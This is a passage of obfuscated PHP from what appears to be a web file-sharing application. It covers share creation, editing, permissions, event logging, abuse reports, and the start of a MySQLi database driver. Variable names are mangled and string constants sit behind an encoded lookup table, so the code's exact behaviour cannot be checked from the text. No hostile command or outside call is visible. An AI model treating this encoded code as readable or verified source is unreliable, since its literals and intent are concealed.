$…’ìáƒ =& $_SERVER[Ò°Ì”İ•]; $Áğğ”«ö = array(array($…’ìáƒ[574] => array($…’ìáƒ[1085], 0), $…’ìáƒ[678] => array($…’ìáƒ[1085], 0), $…’ìáƒ[2119] => $…’ìáƒ[2071])); if ($‚ãØÒ¿æ == $…’ìáƒ[2120]) { $Áğğ”«ö = array($…’ìáƒ[574] => 1); } else { if ($‚ãØÒ¿æ == $…’ìáƒ[1238]) { $Áğğ”«ö = array($…’ìáƒ[678] => 1); } } $Áğğ”«ö[$…’ìáƒ[1768]] = USER_ID; $ÎóûÂ¾Ò = $this->where($Áğğ”«ö)->selectPage($”ì¶ã‰ö); return $ÎóûÂ¾Ò; } protected function listToMe($³í¨€è = 300) { $÷Êíı‰ =& $_SERVER[Ò°Ì”İ•]; $„‰‰ËÏå = Model($÷Êíı‰[2121])->userGroupParents(USER_ID); $ë‰°ÇçÑ = array($÷Êíı‰[663] => SourceModel::TYPE_USER, $÷Êíı‰[581] => USER_ID); if ($„‰‰ËÏå) { $ë‰°ÇçÑ = array(array($÷Êíı‰[663] => SourceModel::TYPE_USER, $÷Êíı‰[581] => USER_ID), array($÷Êíı‰[663] => SourceModel::TYPE_GROUP, $÷Êíı‰[581] => array($÷Êíı‰[7], $„‰‰ËÏå)), $÷Êíı‰[2119] => $÷Êíı‰[2071]); } $ê‘ÚìæÍ = Model($÷Êíı‰[681])->where($ë‰°ÇçÑ)->selectPage($³í¨€è); $÷ôïå¯ = array_to_keyvalue_group($ê‘ÚìæÍ[$÷Êíı‰[457]], $÷Êíı‰[680]); if (!$÷ôïå¯) { return $ê‘ÚìæÍ; } $úù¢Ï½ˆ = $÷Êíı‰[2122]; $ë‰°ÇçÑ = array($÷Êíı‰[680] => array($÷Êíı‰[504], array_keys($÷ôïå¯)), $÷Êíı‰[1768] => array($÷Êíı‰[1087], $÷Êíı‰[241])); $üÏ»¯¼é = $this->field($úù¢Ï½ˆ)->where($ë‰°ÇçÑ)->select(); foreach ($üÏ»¯¼é as $Æ…íé‚ => &$¿”ø•±Ö) { $¿”ø•±Ö[$÷Êíı‰[2118]] = $÷ôïå¯[$¿”ø•±Ö[$÷Êíı‰[680]]]; } unset($¿”ø•±Ö); $Ş ÌÑ´¹ = array($÷Êíı‰[2123] => $üÏ»¯¼é, $÷Êíı‰[2124] => $ê‘ÚìæÍ[$÷Êíı‰[454]]); return $Ş ÌÑ´¹; } protected function shareAdd($òúÖ£ Å, $ƒ…¤­¸) { $¿ìıÎ¡û =& $_SERVER[Ò°Ì”İ•]; $œßŞ®½ú = $this->_addShareData($òúÖ£ Å, $ƒ…¤­¸); if (!empty($ƒ…¤­¸[$¿ìıÎ¡û[2125]])) { $this->_shareAuthSet($œßŞ®½ú, $ƒ…¤­¸[$¿ìıÎ¡û[2125]]); } $this->shareEventAdd($òúÖ£ Å, $ƒ…¤­¸, $¿ìıÎ¡û[2126]); return $œßŞ®½ú; } protected function shareAddSystem($¨Í·å•, $ÓÒòö·) { $Àâ½¾Â² =& $_SERVER[Ò°Ì”İ•]; $»“·Ã± = $this->_addShareData($¨Í·å•, $ÓÒòö·, $Àâ½¾Â²[202]); $this->_shareAuthSet($»“·Ã±, $ÓÒòö·[$Àâ½¾Â²[2125]]); return $»“·Ã±; } private function shareEventAdd($êÊ•†Ò, $Œîí±Ä, $¿êÇå““ = "\x61\144\144") { $´–ä‰‡ =& $_SERVER[Ò°Ì”İ•]; if (!$êÊ•†Ò || $êÊ•†Ò == $´–ä‰‡[241]) { return; } if ($¿êÇå““ == $´–ä‰‡[2126]) { if ($Œîí±Ä[$´–ä‰‡[574]] == $´–ä‰‡[102]) { Model($´–ä‰‡[648])->eventShare($êÊ•†Ò, $´–ä‰‡[2127]); } if ($Œîí±Ä[$´–ä‰‡[678]] == $´–ä‰‡[102]) { Model($´–ä‰‡[648])->eventShare($êÊ•†Ò, $´–ä‰‡[2128]); } return; } $ÂööÒ‘ = $this->getInfoByPath($êÊ•†Ò); $Ç½×éÙŒ = $´–ä‰‡[2129]; if ($ÂööÒ‘[$´–ä‰‡[574]] == $´–ä‰‡[241] && $Œîí±Ä[$´–ä‰‡[574]] == $´–ä‰‡[102]) { $Ç½×éÙŒ = $´–ä‰‡[2127]; } if ($ÂööÒ‘[$´–ä‰‡[574]] == $´–ä‰‡[102] && $Œîí±Ä[$´–ä‰‡[574]] == $´–ä‰‡[241]) { $Ç½×éÙŒ = $´–ä‰‡[2130]; } if ($ÂööÒ‘[$´–ä‰‡[678]] == $´–ä‰‡[241] && $Œîí±Ä[$´–ä‰‡[678]] == $´–ä‰‡[102]) { $Ç½×éÙŒ = $´–ä‰‡[2128]; } if ($ÂööÒ‘[$´–ä‰‡[678]] == $´–ä‰‡[102] && $Œîí±Ä[$´–ä‰‡[678]] == $´–ä‰‡[241]) { $Ç½×éÙŒ = $´–ä‰‡[2131]; } Model($´–ä‰‡[648])->eventShare($êÊ•†Ò, $Ç½×éÙŒ); return; } private function _addShareData($Ò’Ñƒ¿«, $Œ·ùÁ†˜ = array(), $©”œíº = false) { $Àğçàœ‚ =& $_SERVER[Ò°Ì”İ•]; $©ä¹ÔÚ = $©”œíº == $Àğçàœ‚[202] ? 0 : USER_ID; $›©«öóö = array($Àğçàœ‚[503] => $Ò’Ñƒ¿«, $Àğçàœ‚[1759] => $©ä¹ÔÚ); if ($Ò’Ñƒ¿« == 0) { $›©«öóö = array($Àğçàœ‚[2132] => $Œ·ùÁ†˜[$Àğçàœ‚[1253]], $Àğçàœ‚[1759] => $©ä¹ÔÚ); } if ($³ÈàÒÄˆ = $this->where($›©«öóö)->find()) { return $³ÈàÒÄˆ[$Àğçàœ‚[680]]; } if ($Ò’Ñƒ¿« == 0) { $éÏâÄ¢‚ = array($Àğçàœ‚[32] => get_path_this($Œ·ùÁ†˜[$Àğçàœ‚[98]])); } else { $éÏâÄ¢‚ = Model($Àğçàœ‚[898])->sourceInfo($Ò’Ñƒ¿«); if (!$éÏâÄ¢‚) { return !1; } } if (!$Œ·ùÁ†˜[$Àğçàœ‚[1656]]) { $Œ·ùÁ†˜[$Àğçàœ‚[1656]] = $éÏâÄ¢‚[$Àğçàœ‚[32]]; } $„şõ…Ç¶ = array($Àğçàœ‚[1759] => $©ä¹ÔÚ, $Àğçàœ‚[503] => $Ò’Ñƒ¿«, $Àğçàœ‚[1656] => $Àğçàœ‚[12], $Àğçàœ‚[574] => 0, $Àğçàœ‚[678] => 0, $Àğçàœ‚[1253] => $Àğçàœ‚[12], $Àğçàœ‚[394] => $Àğçàœ‚[12], $Àğçàœ‚[962] => $Àğçàœ‚[12], $Àğçàœ‚[2133] => 0, $Àğçàœ‚[2134] => 0, $Àğçàœ‚[834] => 0, $Àğçàœ‚[2135] => $Àğçàœ‚[12], $Àğçàœ‚[2116] => $Àğçàœ‚[12]); $€èÁÆÌ© = explode($Àğçàœ‚[50], $Àğçàœ‚[2136]); foreach ($€èÁÆÌ© as $Ï°¶·±Ê) { if (!isset($Œ·ùÁ†˜[$Ï°¶·±Ê])) { continue; } $„şõ…Ç¶[$Ï°¶·±Ê] = $Œ·ùÁ†˜[$Ï°¶·±Ê]; } $Âù”­Ö± = $this->add($„şõ…Ç¶); $íı¿Š± = array($Àğçàœ‚[2116] => short_id($Âù”­Ö±)); $this->where(array($Àğçàœ‚[2137] => $Âù”­Ö±))->save($íı¿Š±); return $Âù”­Ö±; } private function _shareAuthSet($¡ åëŞ, $ºıô¿‡ö) { $ ¾›ÕÖÍ =& $_SERVER[Ò°Ì”İ•]; if (!is_array($ºıô¿‡ö)) { return !1; } $Ëøâ×û = Model($ ¾›ÕÖÍ[2081]); $Ëøâ×û->where(array($ ¾›ÕÖÍ[680] => $¡ åëŞ))->delete(); $Ûˆ«´Èœ = array(); foreach ($ºıô¿‡ö as $öÃƒİÂâ) { $Ê›¾Õ¸Ô = SourceModel::TYPE_USER; if ($öÃƒİÂâ[$ ¾›ÕÖÍ[201]] == SourceModel::TYPE_GROUP) { $Ê›¾Õ¸Ô = SourceModel::TYPE_GROUP; } $ÃŠÑ = array($ ¾›ÕÖÍ[680] => $¡ åëŞ, $ ¾›ÕÖÍ[201] => $Ê›¾Õ¸Ô, $ ¾›ÕÖÍ[581] => intval($öÃƒİÂâ[$ ¾›ÕÖÍ[581]]), $ ¾›ÕÖÍ[2077] => 0, $ ¾›ÕÖÍ[2138] => -1); if ($öÃƒİÂâ[$ ¾›ÕÖÍ[2077]]) { $ÃŠÑ[$ ¾›ÕÖÍ[2077]] = $öÃƒİÂâ[$ ¾›ÕÖÍ[2077]]; } else { if ($öÃƒİÂâ[$ ¾›ÕÖÍ[2138]]) { $ÃŠÑ[$ ¾›ÕÖÍ[2138]] = $öÃƒİÂâ[$ ¾›ÕÖÍ[2138]]; } } $Ûˆ«´Èœ[] = $ÃŠÑ; } return $Ëøâ×û->addAll($Ûˆ«´Èœ, array(), !0); } public function numViewAdd($Ã´¯÷») { $²é°±ÕÀ =& $_SERVER[Ò°Ì”İ•]; $²Ş¿ÔÔ = array($²é°±ÕÀ[2137] => $Ã´¯÷»); $this->where($²Ş¿ÔÔ)->setAdd($²é°±ÕÀ[2133]); } public function numDownloadAdd($¯§Îñü‡) { $ıÒäÁŸ =& $_SERVER[Ò°Ì”İ•]; $Ï¸‰Ö˜ò = array($ıÒäÁŸ[2137] => $¯§Îñü‡); $this->where($Ï¸‰Ö˜ò)->setAdd($ıÒäÁŸ[2134]); } protected function shareEdit($ëåêÈ¯õ, $‰±¢ƒ€Œ) { $‰—¦Û® =& $_SERVER[Ò°Ì”İ•]; $Ä¶–á‰… = $this->getInfo($ëåêÈ¯õ); if (!$Ä¶–á‰…) { return !1; } $this->_checkLinkShare($‰±¢ƒ€Œ, $Ä¶–á‰…); $Âû—™·é = array(); $æı­Úª¨ = explode($‰—¦Û®[50], $‰—¦Û®[2139]); foreach ($æı­Úª¨ as $İÊñ„’Ç) { if (!array_key_exists($İÊñ„’Ç, $‰±¢ƒ€Œ)) { continue; } $Âû—™·é[$İÊñ„’Ç] = $‰±¢ƒ€Œ[$İÊñ„’Ç]; } $this->shareEventAdd($Ä¶–á‰…[$‰—¦Û®[204]], $‰±¢ƒ€Œ, $‰—¦Û®[1938]); $this->where(array($‰—¦Û®[2137] => $ëåêÈ¯õ))->save($Âû—™·é); if (isset($‰±¢ƒ€Œ[$‰—¦Û®[2125]])) { $this->_shareAuthSet($ëåêÈ¯õ, $‰±¢ƒ€Œ[$‰—¦Û®[2125]]); } return !0; } private function _checkLinkShare($¯¾Øà—, $Ï¡Â©ÁŞ) { $ãÍóÖæ· =& $_SERVER[Ò°Ì”İ•]; if ($¯¾Øà—[$ãÍóÖæ·[574]] != $ãÍóÖæ·[102]) { return; } $º›­–¾ƒ = $Ï¡Â©ÁŞ[$ãÍóÖæ·[101]][$ãÍóÖæ·[204]]; if ($Ï¡Â©ÁŞ[$ãÍóÖæ·[101]][$ãÍóÖæ·[33]] != $ãÍóÖæ·[243]) { $…Ùı½–‘ = $this->_folderReport($º›­–¾ƒ); if (!$…Ùı½–‘) { return; } show_json(LNG($ãÍóÖæ·[2140]) . $ãÍóÖæ·[2141] . $…Ùı½–‘, !1); } $Æ‘ÆçÛù = Model($ãÍóÖæ·[898])->fileInfoGet($Ï¡Â©ÁŞ[$ãÍóÖæ·[101]][$ãÍóÖæ·[204]]); if (!$Æ‘ÆçÛù) { return; } $Ñ¾ÚãÆˆ = $this->shareFileMeta($Æ‘ÆçÛù[$ãÍóÖæ·[553]]); if (isset($Ñ¾ÚãÆˆ[$ãÍóÖæ·[462]]) && $Ñ¾ÚãÆˆ[$ãÍóÖæ·[462]] == $ãÍóÖæ·[102]) { show_json(LNG($ãÍóÖæ·[2142]), !1); } } private function _folderReport($È›¸•íÈ) { $éšõõ‡ =& $_SERVER[Ò°Ì”İ•]; $—±Ä¡ÕÈ = array($éšõõ‡[553] => array($éšõõ‡[1085], 0), $éšõõ‡[823] => 3); $Í ôìØá = Model($éšõõ‡[2143])->where($—±Ä¡ÕÈ)->field($éšõõ‡[553])->select(); if (!$Í ôìØá) { return !1; } $Í ôìØá = array_to_keyvalue($Í ôìØá, $éšõõ‡[12], $éšõõ‡[553]); $„šé˜ = $éšõõ‡[50] . $È›¸•íÈ . $éšõõ‡[50]; $—±Ä¡ÕÈ = array($éšõõ‡[553] => array($éšõõ‡[7], $Í ôìØá), $éšõõ‡[596] => array($éšõõ‡[471], "\45{$„šé˜}\45"), $éšõõ‡[517] => 0); $…ïù è´ = Model($éšõõ‡[898])->where($—±Ä¡ÕÈ)->field($éšõõ‡[2144])->find(); if (!$…ïù è´) { return !1; } $µ„ åò = substr($…ïù è´[$éšõõ‡[596]], strpos($…ïù è´[$éšõõ‡[596]], $„šé˜)); $—±Ä¡ÕÈ = array($éšõõ‡[204] => array($éšõõ‡[7], trim($µ„ åò, $éšõõ‡[50]))); $‘‘ÉÓß´ = Model($éšõõ‡[898])->where($—±Ä¡ÕÈ)->field($éšõõ‡[32])->select(); $Ã¬Á£³ô = array_to_keyvalue($‘‘ÉÓß´, $éšõõ‡[12], $éšõõ‡[32]); $Ã¬Á£³ô[] = $…ïù è´[$éšõõ‡[32]]; return implode($éšõõ‡[8], $Ã¬Á£³ô); } protected function remove($ùÌêƒÉ×) { $¼‚Ş”®Š =& $_SERVER[Ò°Ì”İ•]; $¾Ş”ÒÖä = is_array($ùÌêƒÉ×) ? $ùÌêƒÉ× : array($ùÌêƒÉ×); for ($šÓ‡ùğ– = 0; $šÓ‡ùğ– < count($¾Ş”ÒÖä); $šÓ‡ùğ–++) { $‹ƒÜ¹±‡ = $this->getInfo($¾Ş”ÒÖä[$šÓ‡ùğ–]); if ($‹ƒÜ¹±‡[$¼‚Ş”®Š[678]] == $¼‚Ş”®Š[102]) { Model($¼‚Ş”®Š[648])->eventShare($‹ƒÜ¹±‡[$¼‚Ş”®Š[204]], $¼‚Ş”®Š[2131]); } if ($‹ƒÜ¹±‡[$¼‚Ş”®Š[574]] == $¼‚Ş”®Š[102]) { Model($¼‚Ş”®Š[648])->eventShare($‹ƒÜ¹±‡[$¼‚Ş”®Š[204]], $¼‚Ş”®Š[2130]); } } if (is_array($ùÌêƒÉ×)) { $ùÌêƒÉ× = array($¼‚Ş”®Š[7], $ùÌêƒÉ×); } $›’†ÏâÏ = array($¼‚Ş”®Š[680] => $ùÌêƒÉ×); $¨•¯ÑÒ = $this->where($›’†ÏâÏ)->delete(); if ($¨•¯ÑÒ) { Model($¼‚Ş”®Š[681])->where(array($¼‚Ş”®Š[680] => $ùÌêƒÉ×))->delete(); } return $¨•¯ÑÒ; } protected function removeBySource($×’†Â) { $»ÄĞ­— =& $_SERVER[Ò°Ì”İ•]; $Ôë™ë  = array($»ÄĞ­—[503] => array($»ÄĞ­—[504], $×’†Â)); $Œ”ÎÎ» = $this->field($»ÄĞ­—[680])->where($Ôë™ë )->select(); $Œ”ÎÎ» = array_to_keyvalue($Œ”ÎÎ», $»ÄĞ­—[12], $»ÄĞ­—[680]); if (!$Œ”ÎÎ») { return; } $Ôë™ë  = array($»ÄĞ­—[2137] => array($»ÄĞ­—[504], $Œ”ÎÎ»)); $this->where($Ôë™ë )->delete(); Model($»ÄĞ­—[681])->where($Ôë™ë )->delete(); } public function listAll($„¤ùĞ÷“) { $™¹¡¥¾´ =& $_SERVER[Ò°Ì”İ•]; $ô¯‡ğş‡ = array(); if ($„¤ùĞ÷“[$™¹¡¥¾´[1768]]) { $ô¯‡ğş‡[$™¹¡¥¾´[1768]] = $„¤ùĞ÷“[$™¹¡¥¾´[1768]]; } if ($„¤ùĞ÷“[$™¹¡¥¾´[833]]) { $‰ñÑæ¿® = $„¤ùĞ÷“[$™¹¡¥¾´[834]] ? $„¤ùĞ÷“[$™¹¡¥¾´[834]] : strtotime(date($™¹¡¥¾´[2145])); $ô¯‡ğş‡[$™¹¡¥¾´[244]] = array($™¹¡¥¾´[420], array($„¤ùĞ÷“[$™¹¡¥¾´[833]], $‰ñÑæ¿®)); } if ($„¤ùĞ÷“[$™¹¡¥¾´[33]]) { $ô¯‡ğş‡[$„¤ùĞ÷“[$™¹¡¥¾´[33]]] = 1; } else { $ô¯‡ğş‡[] = array($™¹¡¥¾´[574] => array($™¹¡¥¾´[1085], 0), $™¹¡¥¾´[678] => array($™¹¡¥¾´[1085], 0), $™¹¡¥¾´[2119] => $™¹¡¥¾´[2071]); } if ($„¤ùĞ÷“[$™¹¡¥¾´[2067]]) { $ô¯‡ğş‡[] = array($™¹¡¥¾´[2116] => $„¤ùĞ÷“[$™¹¡¥¾´[2067]], $™¹¡¥¾´[1656] => array($™¹¡¥¾´[471], "\x25{$„¤ùĞ÷“[$™¹¡¥¾´[2067]]}\x25"), $™¹¡¥¾´[2119] => $™¹¡¥¾´[2071]); } $´åØµ– = $this->_makeOrder()->where($ô¯‡ğş‡)->selectPage(20); if (empty($´åØµ–[$™¹¡¥¾´[457]])) { return array(); } $this->_listDataApply($´åØµ–[$™¹¡¥¾´[457]]); return $´åØµ–; } public function listDataApply($æÎŒóï¹) { $this->_listDataApply($æÎŒóï¹); return $æÎŒóï¹; } private function _listDataApply(&$å’Ò½ˆ) { $„ä©­Ó =& $_SERVER[Ò°Ì”İ•]; $¼û¦‘İ÷ = array_to_keyvalue($å’Ò½ˆ, $„ä©­Ó[12], $„ä©­Ó[1768]); $³†äƒ·„ = Model($„ä©­Ó[609])->userListInfo(array_unique($¼û¦‘İ÷)); $Ó±ËŠÕÚ = array_to_keyvalue($å’Ò½ˆ, $„ä©­Ó[12], $„ä©­Ó[204]); $­¼ç©Ó† = Model($„ä©­Ó[898])->sourceListInfo($Ó±ËŠÕÚ, !0); foreach ($å’Ò½ˆ as $¶©ìÌŒ => &$çÂ­Å÷Ş) { $âÖç¥åÓ = $çÂ­Å÷Ş[$„ä©­Ó[1768]]; $çÂ­Å÷Ş[$„ä©­Ó[2146]] = $³†äƒ·„[$âÖç¥åÓ] ? $³†äƒ·„[$âÖç¥åÓ] : !1; $Ğ”ìÃ·Ï = $çÂ­Å÷Ş[$„ä©­Ó[204]]; $çÂ­Å÷Ş[$„ä©­Ó[101]] = $­¼ç©Ó†[$Ğ”ìÃ·Ï] ? $­¼ç©Ó†[$Ğ”ìÃ·Ï] : !1; if ($çÂ­Å÷Ş[$„ä©­Ó[101]][$„ä©­Ó[517]] == $„ä©­Ó[102]) { unset($å’Ò½ˆ[$¶©ìÌŒ]); } if ($çÂ­Å÷Ş[$„ä©­Ó[101]] != $„ä©­Ó[241] && !$çÂ­Å÷Ş[$„ä©­Ó[101]]) { unset($å’Ò½ˆ[$¶©ìÌŒ]); } } unset($çÂ­Å÷Ş); $å’Ò½ˆ = array_values($å’Ò½ˆ); } private function _makeOrder($Ã„Òå§ = '') { $¹ÑóÌœ =& $_SERVER[Ò°Ì”İ•]; $–øÚ›©— = array($¹ÑóÌœ[244], $¹ÑóÌœ[834], $¹ÑóÌœ[2133], $¹ÑóÌœ[2134]); $¸æ÷Å• = array($¹ÑóÌœ[535] => $¹ÑóÌœ[536], $¹ÑóÌœ[537] => $¹ÑóÌœ[538]); $„Ãä‘ªò = Input::get($¹ÑóÌœ[542], $¹ÑóÌœ[7], $¹ÑóÌœ[509], $–øÚ›©—); $»äéï¶ = Input::get($¹ÑóÌœ[543], $¹ÑóÌœ[7], $¹ÑóÌœ[2147], array($¹ÑóÌœ[2064], $¹ÑóÌœ[537])); $»äéï¶ = $¸æ÷Å•[$»äéï¶]; $Ã„Òå§ = $Ã„Òå§ . "{$„Ãä‘ªò}\40{$»äéï¶}"; return $this->order($Ã„Òå§); } public function reportAdd($£²ıŞƒ†) { $‘©¾Ëäù =& $_SERVER[Ò°Ì”İ•]; $²²©»’ô = array($‘©¾Ëäù[680] => $£²ıŞƒ†[$‘©¾Ëäù[680]], $‘©¾Ëäù[1768] => USER_ID); if (Model($‘©¾Ëäù[2143])->where($²²©»’ô)->find()) { return !1; } $ßóºœÈ = array($‘©¾Ëäù[680] => $£²ıŞƒ†[$‘©¾Ëäù[680]], $‘©¾Ëäù[1656] => $£²ıŞƒ†[$‘©¾Ëäù[1656]], $‘©¾Ëäù[204] => $£²ıŞƒ†[$‘©¾Ëäù[204]], $‘©¾Ëäù[553] => $£²ıŞƒ†[$‘©¾Ëäù[553]], $‘©¾Ëäù[1768] => USER_ID, $‘©¾Ëäù[33] => $£²ıŞƒ†[$‘©¾Ëäù[33]], $‘©¾Ëäù[538] => $£²ıŞƒ†[$‘©¾Ëäù[538]]); return Model($‘©¾Ëäù[2143])->add($ßóºœÈ); } public function reportList($÷àÒáî‚) { $Î˜èğÌÆ =& $_SERVER[Ò°Ì”İ•]; $ºÊÉ¢‹º = array(); if ($÷àÒáî‚[$Î˜èğÌÆ[833]]) { $æÏñøŞ× = $÷àÒáî‚[$Î˜èğÌÆ[834]] ? $÷àÒáî‚[$Î˜èğÌÆ[834]] : strtotime(date($Î˜èğÌÆ[2145])); $ºÊÉ¢‹º[$Î˜èğÌÆ[244]] = array($Î˜èğÌÆ[420], array($÷àÒáî‚[$Î˜èğÌÆ[833]], $æÏñøŞ×)); } if (isset($÷àÒáî‚[$Î˜èğÌÆ[33]]) && in_array($÷àÒáî‚[$Î˜èğÌÆ[33]], array($Î˜èğÌÆ[102], $Î˜èğÌÆ[522], $Î˜èğÌÆ[2148], $Î˜èğÌÆ[2149], $Î˜èğÌÆ[2150]))) { $ºÊÉ¢‹º[$Î˜èğÌÆ[33]] = $÷àÒáî‚[$Î˜èğÌÆ[33]]; } if (isset($÷àÒáî‚[$Î˜èğÌÆ[823]]) && in_array($÷àÒáî‚[$Î˜èğÌÆ[823]], array($Î˜èğÌÆ[241], $Î˜èğÌÆ[102], $Î˜èğÌÆ[522], $Î˜èğÌÆ[2148]))) { $ºÊÉ¢‹º[$Î˜èğÌÆ[823]] = $÷àÒáî‚[$Î˜èğÌÆ[823]]; } $ ş„ŸÆ = Input::get($Î˜èğÌÆ[543], $Î˜èğÌÆ[7], $Î˜èğÌÆ[2147], array($Î˜èğÌÆ[2064], $Î˜èğÌÆ[537])); $“‡××İ = array($Î˜èğÌÆ[535] => $Î˜èğÌÆ[536], $Î˜èğÌÆ[537] => $Î˜èğÌÆ[538]); $Š“Á›ğ‘ = $Î˜èğÌÆ[2151] . $“‡××İ[$ ş„ŸÆ]; $ÈîøŒ¤à = Model($Î˜èğÌÆ[2143])->where($ºÊÉ¢‹º)->order($Š“Á›ğ‘)->selectPage(20); if (empty($ÈîøŒ¤à[$Î˜èğÌÆ[457]])) { return array(); } $ÜÖ®·ÛÑ = array_to_keyvalue_group($ÈîøŒ¤à[$Î˜èğÌÆ[457]], $Î˜èğÌÆ[823], $Î˜èğÌÆ[680]); if (!empty($ÜÖ®·ÛÑ[0])) { $÷àÒáî‚ = $ÜÖ®·ÛÑ[0]; $ºÊÉ¢‹º = array($Î˜èğÌÆ[680] => array($Î˜èğÌÆ[7], $÷àÒáî‚)); $µÂ˜Öá— = $this->where($ºÊÉ¢‹º)->field($Î˜èğÌÆ[680])->select(); $µÂ˜Öá— = array_to_keyvalue($µÂ˜Öá—, $Î˜èğÌÆ[12], $Î˜èğÌÆ[680]); $—˜Úâì = array_diff($÷àÒáî‚, $µÂ˜Öá—); if (!empty($—˜Úâì)) { foreach ($ÈîøŒ¤à[$Î˜èğÌÆ[457]] as $ìÇ£Šš¤ => $Âù„›øá) { if (in_array($Âù„›øá[$Î˜èğÌÆ[680]], $—˜Úâì)) { unset($ÈîøŒ¤à[$Î˜èğÌÆ[457]][$ìÇ£Šš¤]); } } } } $this->_listDataApply($ÈîøŒ¤à[$Î˜èğÌÆ[457]]); return $ÈîøŒ¤à; } public function reportStatus($Ë½£ĞÍ†) { $Úœ’»å =& $_SERVER[Ò°Ì”İ•]; $ÄßôŞ…› = array($Úœ’»å[487] => $Ë½£ĞÍ†[$Úœ’»å[487]]); $×ÓúúÀ = Model($Úœ’»å[2143])->where($ÄßôŞ…›)->field($Úœ’»å[2152])->find(); if (!$×ÓúúÀ) { return !1; } $Éö£©ÎÅ = array($Úœ’»å[823] => $Ë½£ĞÍ†[$Úœ’»å[823]]); if ($Ë½£ĞÍ†[$Úœ’»å[823]] == $Úœ’»å[2148] && $×ÓúúÀ[$Úœ’»å[823]] == $Úœ’»å[2148]) { $Éö£©ÎÅ[$Úœ’»å[823]] = 0; } $ûğÔË¢ = Model($Úœ’»å[2143])->where($ÄßôŞ…›)->save($Éö£©ÎÅ); if ($Ë½£ĞÍ†[$Úœ’»å[823]] == $Úœ’»å[522]) { if ($×ÓúúÀ[$Úœ’»å[553]] != $Úœ’»å[241] && $this->shareFileMeta($×ÓúúÀ[$Úœ’»å[553]])) { $this->shareFileMeta($×ÓúúÀ[$Úœ’»å[553]], 0); } $this->remove($×ÓúúÀ[$Úœ’»å[680]]); return !0; } if ($ûğÔË¢ && $Ë½£ĞÍ†[$Úœ’»å[823]] == $Úœ’»å[2148]) { $ˆ‚ìé¼² = $Éö£©ÎÅ[$Úœ’»å[823]] == $Úœ’»å[2148] ? 1 : 0; $this->shareFileMeta($×ÓúúÀ[$Úœ’»å[553]], $ˆ‚ìé¼²); $this->removeByFile($×ÓúúÀ[$Úœ’»å[553]]); } return $ûğÔË¢; } private function removeByFile($¢Ë–ñ) { $™–ÀèÎº =& $_SERVER[Ò°Ì”İ•]; $©¶úŒ¯ = Model($™–ÀèÎº[898])->where(array($™–ÀèÎº[553] => $¢Ë–ñ))->field($™–ÀèÎº[204])->select(); $ã¤ÚçãÒ = array_to_keyvalue($©¶úŒ¯, $™–ÀèÎº[12], $™–ÀèÎº[204]); $Ä¾¡âŠ— = array($™–ÀèÎº[204] => array($™–ÀèÎº[7], $ã¤ÚçãÒ), $™–ÀèÎº[574] => 1); $©¶úŒ¯ = $this->where($Ä¾¡âŠ—)->field($™–ÀèÎº[680])->select(); if (empty($©¶úŒ¯)) { return; } $ñĞôŸíï = array_to_keyvalue($©¶úŒ¯, $™–ÀèÎº[12], $™–ÀèÎº[680]); $this->remove($ñĞôŸíï); } private function shareFileMeta($ş¾Øî„, $¿–†µã© = null) { $ÒÃŒ«¯â =& $_SERVER[Ò°Ì”İ•]; $Ôõ…èÇ´ = array($ÒÃŒ«¯â[553] => $ş¾Øî„, $ÒÃŒ«¯â[108] => $ÒÃŒ«¯â[2153]); if (is_null($¿–†µã©)) { return Model($ÒÃŒ«¯â[2154])->where($Ôõ…èÇ´)->find(); } $Ôõ…èÇ´[$ÒÃŒ«¯â[462]] = $¿–†µã©; Model($ÒÃŒ«¯â[2154])->add($Ôõ…èÇ´, array(), !0); } } goto Aîà¥Ö×ê”; A§ìÚáš¥: class DbMysqli extends Db { public function __construct($Ñµ“Œí– = '') { $Øİ”¨õã =& $_SERVER[Ò°Ì”İ•]; if (!extension_loaded($Øİ”¨õã[985])) { think_exception(think_lang($Øİ”¨õã[14]) . $Øİ”¨õã[986]); } if (!empty($Ñµ“Œí–)) { $this->config = $Ñµ“Œí–; if (empty($this->config[$Øİ”¨õã[17]])) { $this->config[$Øİ”¨õã[17]] = $Øİ”¨õã[12]; } } } public function connect($íâÙÆ§÷ = '', $»Â¨ÏÉç = 0) { $‘•×úä =& $_SERVER[Ò°Ì”İ•]; if (!isset($this->linkID[$»Â¨ÏÉç])) { if (empty($íâÙÆ§÷)) { $íâÙÆ§÷ = $this->config; } $this->linkID[$»Â¨ÏÉç] = new mysqli($íâÙÆ§÷[$‘•×úä[959]], $íâÙÆ§÷[$‘•×úä[961]], $íâÙÆ§÷[$‘•×úä[962]], $íâÙÆ§÷[$‘•×úä[21]], $íâÙÆ§÷[$‘•×úä[960]] ? intval($íâÙÆ§÷[$‘•×úä[960]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $‚’Š›½â = $this->linkID[$»Â¨ÏÉç]->server_version; $this->linkID[$»Â¨ÏÉç]->query($‘•×úä[963] . think_config($‘•×úä[964]) . $‘•×úä[68]); if ($‚’Š›½â > $‘•×úä[965]) { $this->linkID[$»Â¨ÏÉç]->query($‘•×úä[966]); } $this->connected = !0; if (1 != think_config($‘•×úä[22])) { unset($this->config); } } return $this->linkID[$»Â¨ÏÉç]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¡…ùÇ¾ü) { $¿¾ù«é× =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¡…ùÇ¾ü; if ($this->queryID) { $this->free(); } think_action_status($¿¾ù«é×[23], 1); think_status($¿¾ù«é×[24]); $this->queryID = $this->_linkID->query($¡…ùÇ¾ü); if ($this->_linkID->more_results()) { while (($§Œ’æ† = $this->_linkID->next_result()) != NULL) { $§Œ’æ†->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Şàä’ç) { $¦¤”¯¡ã =& $_SERVER[Ò°Ì”İ•]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Şàä’ç; if ($this->queryID) { $this->free(); } think_action_status($¦¤”¯¡ã[25], 1); think_status($¦¤”¯¡ã[24]); $Ë©Æ¥œ§ = $this->_linkID->query($Şàä’ç); $this->debug(); if (!1 === $Ë©Æ¥œ§) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $£ğï„¨ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); 